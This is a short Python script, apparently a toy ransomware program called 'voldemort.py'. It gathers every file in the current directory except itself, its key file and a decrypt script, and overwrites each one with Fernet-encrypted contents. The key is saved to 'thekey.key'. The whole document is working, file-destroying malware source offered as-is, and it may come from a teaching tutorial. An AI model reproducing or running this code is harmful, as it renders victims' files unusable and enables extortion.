import os
from cryptography.fernet import Fernet


files = [] 
for file in os.listdir():
    if file =="voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


print("The number of files is {} and the files are {}".format(len(files),files))

key= Fernet.generate_key()

with open("thekey.key", 'wb+') as thekey:
    thekey.write(key)

for file in files:
    with open(file,'rb+') as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents) #encrypt the file content
    with open(file,'wb+') as thefile:
        thefile.write(contents_encrypted)
